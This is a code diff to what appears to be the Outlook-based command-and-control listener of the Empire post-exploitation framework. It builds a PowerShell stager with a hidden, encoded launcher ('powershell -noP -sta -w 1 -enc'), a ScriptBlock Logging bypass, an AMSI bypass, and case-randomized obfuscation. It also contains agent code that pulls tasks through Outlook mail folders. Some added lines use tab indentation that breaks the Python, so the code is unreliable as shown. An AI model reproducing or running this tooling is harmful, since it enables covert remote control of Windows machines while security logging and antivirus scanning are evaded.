@@ -2,10 +2,8 @@ import logging
 import base64
 import random
 import os
-import ssl
 import time
 import copy
-import sys
 from pydispatch import dispatcher
 from flask import Flask, request, make_response
 
@@ -57,6 +55,11 @@ class Listener:
                 'Description'   :   'Port for the listener.',
                 'Required'      :   True,
                 'Value'         :   80
+            },
+            'Launcher' : {
+                'Description'   :   'Launcher string.',
+                'Required'      :   True,
+                'Value'         :   'powershell -noP -sta -w 1 -enc '
             },
             'StagingKey' : {
                 'Description'   :   'Staging key for initial agent negotiation.',
@@ -176,6 +179,7 @@ class Listener:
             # extract the set options for this instantiated listener
             listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
             host = listenerOptions['Host']['Value']
+            launcher = listenerOptions['Launcher']['Value']
             stagingKey = listenerOptions['StagingKey']['Value']
             profile = listenerOptions['DefaultProfile']['Value']
             uris = [a for a in profile.split('|')[0].split(',')]
@@ -184,9 +188,9 @@ class Listener:
             if language.startswith('po'):
                 # PowerShell
 
-                stager = '$ErrorActionPreference = \"SilentlyContinue\";'
+		stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
-                    stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
+		    stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
 
                     # ScriptBlock Logging bypass
                     stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
@@ -208,7 +212,7 @@ class Listener:
                     stager += helpers.randomize_capitalization("=$val}")
                     stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
                     stager += "'signatures','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
+                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}};")
 
                     # @mattifestation's AMSI bypass
                     stager += helpers.randomize_capitalization('Add-Type -assembly "Microsoft.Office.Interop.Outlook";')
@@ -255,7 +259,7 @@ class Listener:
                 if obfuscate:
                     stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
-                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
+                if encode:
                     return helpers.powershell_launcher(stager, launcher)
                 else:
                     # otherwise return the case-randomized stager
@@ -280,7 +284,6 @@ class Listener:
         uris = [a.strip('/') for a in profile.split('|')[0].split(',')]
         stagingKey = listenerOptions['StagingKey']['Value']
         host = listenerOptions['Host']['Value']
-        workingHours = listenerOptions['WorkingHours']['Value']
         folder = listenerOptions['Folder']['Value']
 
         if language.lower() == 'powershell':
@@ -297,10 +300,6 @@ class Listener:
             # patch the server and key information
             stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
             stager = stager.replace('REPLACE_FOLDER', folder)
-
-            # patch in working hours if any
-            if workingHours != "":
-                stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)
 
             randomizedStager = ''
 
@@ -342,8 +341,8 @@ class Listener:
         profile = listenerOptions['DefaultProfile']['Value']
         lostLimit = listenerOptions['DefaultLostLimit']['Value']
         killDate = listenerOptions['KillDate']['Value']
-        folder = listenerOptions['Folder']['Value']
         workingHours = listenerOptions['WorkingHours']['Value']
+        folder = listenerOptions['Folder']['Value']
         b64DefaultResponse = base64.b64encode(self.default_response())
 
         if language == 'powershell':
@@ -370,6 +369,8 @@ class Listener:
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
                 code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
+            if workingHours != "":
+                code = code.replace('$WorkingHours,', "$WorkingHours = '" + str(workingHours) + "',")
 
             return code
         else:
@@ -392,8 +393,11 @@ class Listener:
                 """ % (listenerOptions['Host']['Value'])
 
                 getTask = """
+
                     $script:GetTask = {
                         try {
+                                # keep checking to see if there is response
+				#write-host "requesting task";
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket);
@@ -407,9 +411,9 @@ class Listener:
                                 $mail.save() | out-null;
                                 $mail.Move($fld)| out-null;
 
-                                # keep checking to see if there is response
                                 $break = $False;
                                 [byte[]]$b = @();
+                                $noTask = 0
 
                                 While ($break -ne $True){
                                   foreach ($item in $fld.Items) {
@@ -429,14 +433,14 @@ class Listener:
 
                         }
                         catch {
-
+                           #Start-Negotiate -S "$ser" -SK $sk -UA $ua;
                         }
                         while(($fldel.Items | measure | %{$_.Count}) -gt 0 ){ $fldel.Items | %{$_.delete()};} 
                     }
                 """
 
                 sendMessage = """
-                    $script:SendMessage = {
+                   $script:SendMessage = {
                         param($Packets)
 
                         if($Packets) {
@@ -622,19 +626,7 @@ class Listener:
             certPath = listenerOptions['CertPath']['Value']
             host = listenerOptions['Host']['Value']
             if certPath.strip() != '' and host.startswith('https'):
-                certPath = os.path.abspath(certPath)
-
-                # support any version of tls
-                pyversion = sys.version_info
-                if pyversion[0] == 2 and pyversion[1] == 7 and pyversion[2] >= 13:
-                    proto = ssl.PROTOCOL_TLS
-                elif pyversion[0] >= 3:
-                    proto = ssl.PROTOCOL_TLS
-                else:
-                    proto = ssl.PROTOCOL_SSLv23
-
-                context = ssl.SSLContext(proto)
-                context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key"  % (certPath))
+                context = ("%s/data/empire.pem" % (self.mainMenu.installPath), "%s/data/empire.pem"  % (self.mainMenu.installPath))
                 app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
             else:
                 app.run(host=bindIP, port=int(port), threaded=True)
